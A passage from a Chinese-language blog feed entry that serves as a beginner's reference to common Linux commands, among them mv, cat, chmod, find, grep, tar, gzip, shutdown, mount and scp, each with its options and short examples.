操作要覆盖某已有的目标文件时不给任何指示;</p></blockquote><p><code>实例</code></p><p>目标目录与原目录一致，指定了新文件名，效果就是仅仅重命名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/b.txt</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致，没有指定新文件名，效果就是仅仅移动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/ </span><br><span class="line">或者</span><br><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test</span><br></pre></td></tr></table></figure><p>目标目录与原目录不一致, 指定了新文件名，效果就是：移动 + 重命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  /home/ffxhd/a.txt   /home/ffxhd/test/c.txt</span><br></pre></td></tr></table></figure><h4 id="0x06-cat（Catenate，连锁）"><a href="#0x06-cat（Catenate，连锁）" class="headerlink" title="0x06 cat（Catenate，连锁）"></a><font color="navy"><code>0x06 cat（Catenate，连锁）</code></font></h4><p><code>功能</code>：用于连接文件并打印到标准输出设备上</p><p><code>相关选项</code>：</p><blockquote><ul><li><strong>-n</strong>：由 1 开始对所有输出的行数编号</li><li><strong>-b</strong>：和 -n 相似，只不过对于空白行不编号</li><li><strong>-s</strong>：当遇到有连续两行以上的空白行，就代换为一行的空白行</li><li><strong>-E 或 —show-ends</strong> : 在每行结束处显示 $。</li></ul></blockquote><p><code>相关实例</code></p><p>把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n textfile1 &gt; textfile2</span><br></pre></td></tr></table></figure><p>把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -b textfile1 textfile2 &gt;&gt; textfile3</span><br></pre></td></tr></table></figure><p>抓取文件中感兴趣的关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 文件 | grep 关键字</span><br></pre></td></tr></table></figure><p><strong>cat创建文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法一：cat &gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">如果文件名已经存在，那么上述的命令格式会覆盖原来文件中的内容，</span><br><span class="line">要想不覆盖则用下面的：</span><br><span class="line">cat &gt;&gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">=====================================</span><br><span class="line">法二：仅用cat &gt; 文件名，然后Ctrl + C退出bash</span><br></pre></td></tr></table></figure><p><img src="/images/104-1.png" alt="这里写图片描述"></p><blockquote><p>这篇可以看一下<a href="https://blog.csdn.net/XD_hebuters/article/details/79204812" target="_blank" rel="noopener">Linux cat命令使用</a></p></blockquote><h3 id="0x02-权限管理"><a href="#0x02-权限管理" class="headerlink" title="0x02 权限管理"></a><font color="brown"><code>0x02 权限管理</code></font></h3><p><a href>有关权限位请看我的另一篇博客：linux的权限位</a>，这里就再简单的介绍一下：</p><p><code>权限位</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><p><code>权限位的个数</code>：<strong>权限位是十位</strong></p><blockquote><p>第一位：代表文件类型</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-：普通文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;d：目录文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; l：链接文件</p><p>其他九位：代表各用户的权限<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;前三位：属主权限u<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; 中间三位：属组权限g<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; 后三位：其他人权限o</p></blockquote><p><code>r、w、x</code>：</p><blockquote><p>r 表示文件可读，用数字 4 来代表</p><p>w 表示文件可写，用数字 2 来代表</p><p>x 表示文件可执行，用数字 1 来代表</p></blockquote><p><code>权限意义</code>：</p><blockquote><p><strong>⇲ 权限对文件的含义：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r：读取文件内容 如：cat、more、head、tail<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;w：编辑、新增、修改文件内容 如：vi、echo 但是不包含删除文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;x：可执行 /tmp/11/22/abc </p><p><strong>⇲ 权限对目录的含义：</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r：可以查询目录下文件名 如：ls<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;w：具有修改目录结构的权限 如：touch、rm、mv、cp<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;x：可以进入目录 如：cd</p></blockquote><h4 id="0x00-chmod（change-the-permissions-mode-of-a-file）"><a href="#0x00-chmod（change-the-permissions-mode-of-a-file）" class="headerlink" title="0x00 chmod（change the permissions mode of a file）"></a><font color="navy"><code>0x00 chmod（change the permissions mode of a file）</code></font></h4><p><code>功能</code>：修改权限</p><p><code>相关选项</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-=][rwxX]...][,...]</span><br></pre></td></tr></table></figure><p>其中：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行</p><p>其他参数说明：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-v : 显示权限变更的详细资料</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更)</p><p><code>实例</code>：</p><p>将文件 file1.txt 设为所有人皆可读取 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 设为所有人皆可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure><p>将 ex1.py 设定为只有该文件拥有者可以执行 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure><p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure><p>此外chmod也可以用数字来表示权限如 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod abc file</span><br></pre></td></tr></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。</p><p><strong>r=4，w=2，x=1</strong></p><ul><li>若要rwx属性则4+2+1=7；</li><li>若要rw-属性则4+2=6；</li><li>若要r-x属性则4+1=5。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>效果相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 771 file</span><br></pre></td></tr></table></figure><h3 id="0x03-帮助命令"><a href="#0x03-帮助命令" class="headerlink" title="0x03 帮助命令"></a><font color="brown"><code>0x03 帮助命令</code></font></h3><h4 id="0x00-man（manual）"><a href="#0x00-man（manual）" class="headerlink" title="0x00 man（manual）"></a><font color="navy"><code>0x00 man（manual）</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h4 id="0x01-help"><a href="#0x01-help" class="headerlink" title="0x01 help"></a><font color="navy"><code>0x01 help</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h3 id="0x04-查找命令"><a href="#0x04-查找命令" class="headerlink" title="0x04 查找命令"></a><font color="brown"><code>0x04 查找命令</code></font></h3><h4 id="0x00-whereis（whereis）"><a href="#0x00-whereis（whereis）" class="headerlink" title="0x00 whereis（whereis）"></a><font color="navy"><code>0x00 whereis（whereis）</code></font></h4><p><code>功能</code>：查找命令的命令，同时看到帮助文档位置</p><p><code>实例</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/谷歌下载文件# whereis ls</span><br><span class="line">ls: /bin/ls /usr/share/man/man1/ls.1.gz</span><br></pre></td></tr></table></figure><h4 id="0x01-find"><a href="#0x01-find" class="headerlink" title="0x01 find"></a><font color="navy"><code>0x01 find</code></font></h4><p><code>功能</code>：搜索命令，会在给定位置搜寻与条件匹配的文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 查找位置 -name 文件名</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-name 文件名：按照文件名查找（区分大小写二）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-iname 文件名：按照文件名查找，不区分大小写</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-user 用户名：按照属主用户名查找文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-group 组名 按照属组组名查找文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-size 文件名：按照文件大小k M 如：find / -size +50k</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-type：按照文件类型查找(f=普通 d=目录 l=链接)</p><h4 id="0x02-grep"><a href="#0x02-grep" class="headerlink" title="0x02 grep"></a><font color="navy"><code>0x02 grep</code></font></h4><p><code>功能</code>：查找符合条件的字串</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 选项 &apos;字串&apos; 查找路径</span><br></pre></td></tr></table></figure><p>比如：在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep test *file</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p>-i：忽略大小写</p><p>-v：反向选择</p><p><strong>-A</strong>：除了显示符合范本样式的那一列之外，并显示该行之后的内容</p></blockquote><p><code>相关知识：管道符 “|”</code></p><blockquote><p><code>命令1 | 命令2</code>：命令 1 的执行结果，作为命令 2 的执行条件</p><p><code>cat 文件名 | grep &#39;字串&#39;</code>：提取含有字符串的行</p><p><code>ls -l /etc | more</code>：分屏显示 ls 内容</p></blockquote><h3 id="0x05-压缩和解压缩"><a href="#0x05-压缩和解压缩" class="headerlink" title="0x05 压缩和解压缩"></a><font color="brown"><code>0x05 压缩和解压缩</code></font></h3><p><code>相关知识：</code></p><blockquote><p><strong>➤ linux可以识别的常见压缩格式</strong>：.gz .bz2</p><p><strong>➤ 常见的压缩和打包命令</strong>：.tar.gz .tar.bz2</p></blockquote><h4 id="0x00-tar（Tape-archive，磁带档案）"><a href="#0x00-tar（Tape-archive，磁带档案）" class="headerlink" title="0x00 tar（Tape archive，磁带档案）"></a><font color="navy"><code>0x00 tar（Tape archive，磁带档案）</code></font></h4><p><code>功能</code>：能创建、查看和提取tar压缩文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩文件名 源文件  // 压缩文件</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p><code>创建压缩文件</code>：<code>tar -cvf 压缩文件名 源文件</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-c：建立新的备份文件（压缩）</p><p><code>查看压缩文件</code>：<code>tar -tvf 压缩文件名</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-t：列出备份文件的内容</p><p><code>提取对应压缩文件</code>：<code>tar -xvf 压缩文件名</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-x：从备份文件中还原文件</p><p><code>通用选项</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-v：显示指令执行过程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-f：指定压缩包名</p><p><code>多个文件/目录压缩</code>：<code>tar czvf my.tar.gz file1 file2,...（file*）</code></p></blockquote><h4 id="0x01-gzip"><a href="#0x01-gzip" class="headerlink" title="0x01 gzip"></a><font color="navy"><code>0x01 gzip</code></font></h4><p><code>功能</code>：命令创建和提取gzip压缩文件</p><p><code>相关选项</code>：</p><p>压缩相关选项：</p><blockquote><p><code>1、保留原始文件</code></p><p>如果要保留输入（原始）文件，请使用-k选项：</p><p><code>$ gzip -k filename</code></p><p>保留原始文件的另一个选项是使用-c选项，它使gzip在标准输出上写入并将输出重定向到文件：</p><p><code>$ gzip -c filename &gt; filename.gz</code></p><p><code>2、详细输出</code></p><p>如果要查看减少百分比和正在处理的文件的名称，请使用-v选项：</p><p><code>$ gzip -v filename</code></p><p>返回数据：</p><p><code>filename:　7.5% -- replaced with filename.gz</code></p><p><code>3、压缩多个文件</code></p><p>你还可以将多个文件作为参数传递给命令，例如，要压缩名为file1、file2、file3的文件，你将运行以下命令：</p><p><code>$ gzip file1 file2 file3</code></p><p>上面的命令将创建三个压缩文件：file1.gz、file2.gz、file3.gz，要想将多个文件压缩至一个压缩包</p><p><code>$ gzip file1 file2 file3 &gt; file4.gz</code></p><p><code>4、压缩目录中的所有文件</code></p><p>要压缩给定目录中的所有文件，请使用-r选项：</p><p><code>$ gzip -r directory</code></p><p>gzip将递归遍历整个目录结构并压缩目录及其子目录中的所有文件。</p></blockquote><p>解压相关选项：</p><blockquote><p>1.要解压缩.gz文件，请使用-d选项：</p><p><code>gzip -d</code>：来提取压缩文件</p><p>但是不会保留压缩文件，要想保留压缩文件，用-k选项：</p><p><code>$ gzip -dk filename.gz</code></p><p>要一次解压缩多个文件，请将文件名作为参数传递给gzip：</p><p><code>$ gzip -d file1 file2 file3</code></p><p>当与-d和-r选项一起使用时，gzip以递归方式解压缩给定目录中的所有文件：</p><p><code>$ gzip -dr directory</code></p><p>2.与-l选项一起使用时，gzip显示有关给定压缩文件的统计信息：</p><p><code>gzip -l filename</code>：列出压缩文件的相关信息</p></blockquote><h3 id="0x05-关机和重启命令"><a href="#0x05-关机和重启命令" class="headerlink" title="0x05 关机和重启命令"></a><font color="brown"><code>0x05 关机和重启命令</code></font></h3><h4 id="0x00-shutdown"><a href="#0x00-shutdown" class="headerlink" title="0x00 shutdown"></a><font color="navy"><code>0x00 shutdown</code></font></h4><p><code>功能</code>：关机/重启</p><p><code>相关选项</code>：</p><blockquote><p><code>shutdown -h now</code>：立即关机</p><p><code>shutdown -r now</code>：立即重启</p><p><code>shutdown -t [seconds]</code>：设定在几秒钟之后进行关机程序</p><p><code>shutdown +5 “System will shutdown after 5 minutes”</code>：5分钟够关机并显示警告信息</p></blockquote><h4 id="0x01-reboot"><a href="#0x01-reboot" class="headerlink" title="0x01 reboot"></a><font color="navy"><code>0x01 reboot</code></font></h4><p><code>功能</code>：关机/重启挂载（重新启动）</p><h4 id="0x02-mount"><a href="#0x02-mount" class="headerlink" title="0x02 mount"></a><font color="navy"><code>0x02 mount</code></font></h4><p><code>相关知识点：光盘挂载</code></p><blockquote><ol><li><p>提一句Windows下，mount挂载，就是给磁盘分区提供一个盘符（C,D,E,…）。比如插入U盘后系统自动分配给了它I:盘符其实就是挂载，退优盘的时候进行安全弹出，其实就是卸载unmount。</p></li><li><p>Linux下，不像Windows可以有C,D,E,多个目录，Linux只有一个根目录/。在装系统时，我们分配给linux的所有区都在/下的某个位置，比如/home等等。</p></li><li><p>提问者插入了新硬盘，分了新磁盘区sdb1。它现在还不属于/。</p></li><li><p>我们虽然可以在一些图形桌面系统里找到他的位置，浏览管理里面的文件，但在命令行却不知怎么访问它的目录，比如无法使用cd或者ls。也无法在编程时指定一个目录对它操作。</p></li><li><p>这时提问者使用了 mount /dev/sdb1 ~/Share/ ，把新硬盘的区sdb1挂载到工作目录的~/Share/文件夹下，之后访问这个~/Share/文件夹就相当于访问这个硬盘2的sdb1分区了。对/Share/的任何操作，都相当于对sdb1里文件的操作。</p></li><li><p>所以Linux下，mount挂载的作用，就是<strong>将一个设备（通常是存储设备）挂接到一个已存在的目录上。</strong>访问这个目录就是访问该存储设备。</p></li><li><p><strong>linux操作系统将所有的设备都看作文件，它将整个计算机的资源都整合成一个大的文件目录。</strong>我们要访问存储设备中的文件，必须将文件所在的分区挂载到一个已存在的目录上，然后通过访问这个目录来访问存储设备。挂载就是把设备放在一个目录下，让系统知道怎么管理这个设备里的文件，了解这个存储设备的可读写特性之类的过程。</p></li><li><p>我们不是有/dev/sdb1 吗，直接对它操作不就行了？这不是它的目录吗？</p></li><li><p>这不是它的目录。虽然/dev是个目录，但/dev/sdb1不是目录。可以发现ls/dev/sdb1无法执行。/dev/sdb1，是一个类似指针的东西，指向这个分区的原始数据块。mount前，系统并不知道这个数据块哪部分数据代表文件，如何对它们操作。</p></li><li><p>插入CD，系统其实自动执行了 mount /dev/cdrom /media/cdrom。所以可以直接在/media/cdrom中对CD中的内容进行管理。</p></li></ol></blockquote><p><code>功能</code>：是经常会使用到的命令，它用于挂载Linux系统外的文件</p><p><code>案例</code>：</p><p>将 /dev/hda1 挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/hda1 /mnt（空目录）</span><br></pre></td></tr></table></figure><p>将 /dev/hda1 用唯读模式挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro /dev/hda1 /mnt</span><br></pre></td></tr></table></figure><p>将 /tmp/image.iso 这个光碟的 image 档使用 loop 模式挂在 /mnt/cdrom之下。用这种方法可以将一般网络上可以找到的 Linux 光 碟 ISO 档在不烧录成光碟的情况下检视其内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mount -o loop /tmp/image.iso /mnt/cdrom</span><br></pre></td></tr></table></figure><p><strong>光盘挂载</strong></p><blockquote><p>/dev/sda1 第一个scsi硬盘的第一分区</p><p>/dev/cdrom 光盘</p><p>/dev/hdc IDE硬盘 centos 5.5</p><p>/dev/sr0 光盘 centos 6.x</p><p>mount -t 文件系统 设备描述文件 挂载点（已经存在空目录）mount -t iso9660 /dev/cdrom /mnt/cdrom</p></blockquote><p><strong>光盘卸载</strong></p><blockquote><p>umount /dev/cdrom</p><p>umount /mnt/cdrom 注意：退出挂载目录，才能卸载</p><p>fdisk -l 查看设备名</p><p>mount -t vfat /dev/sdb1 /mnt/usb</p></blockquote><h3 id="0x06-网络命令"><a href="#0x06-网络命令" class="headerlink" title="0x06 网络命令"></a><font color="brown"><code>0x06 网络命令</code></font></h3><h4 id="0x00-ping"><a href="#0x00-ping" class="headerlink" title="0x00 ping"></a><font color="navy"><code>0x00 ping</code></font></h4><p><code>功能</code>：测试网络畅通性</p><p><code>命令格式</code>：<code>ping -c 次数 ip</code></p><h4 id="0x01-ifconfig"><a href="#0x01-ifconfig" class="headerlink" title="0x01 ifconfig"></a><font color="navy"><code>0x01 ifconfig</code></font></h4><p><code>功能</code>：查询本机网络信息</p><h4 id="0x02-scp"><a href="#0x02-scp" class="headerlink" title="0x02 scp"></a><font color="navy"><code>0x02 scp</code></font></h4><p><code>功能</code>：从服务器上下载文件</p><p><code>命令格式</code>：<code>scp -P 2222 username@servername:remote_dir/ /tmp/local_dir</code></p><p><code>实例</code>：从pwnable.kr上面下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 fd@pwnable.kr:/home/fd/fd.c /home/mask/</span><br></pre></td></tr></table></figure><h4 id="0x03-其他命令"><a href="#0x03-其他命令" class="headerlink" title="0x03 其他命令"></a><font color="navy"><code>0x03 其他命令</code></font></h4><blockquote><p>其他相关命令见我转载的一篇博客：<a href="http://vbird.dic.ksu.edu.tw/linux_server/0140networkcommand/0140networkcommand-centos4.php" target="_blank" rel="noopener"><strong>Linux 常用网络命令介绍</strong></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-目录操作命令&quot;&gt;&lt;a href=&quot;#0x00-目录操作命令&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录操作命令&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x00 目录操作命令&lt;/code&gt;&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
